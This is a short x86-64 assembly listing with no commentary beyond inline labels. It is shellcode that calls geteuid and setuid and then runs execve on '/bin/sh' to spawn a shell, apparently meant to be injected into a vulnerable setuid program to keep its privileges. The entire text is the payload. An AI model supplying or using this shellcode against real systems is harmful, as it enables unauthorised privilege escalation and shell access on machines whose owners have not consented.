section .text
global _start

_start:
    ; geteuid()
    xor rax, rax
    mov al, 107
    syscall

    ; setuid(geteuid())
    mov rdi, rax
    mov al, 105
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    mov al, 59
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

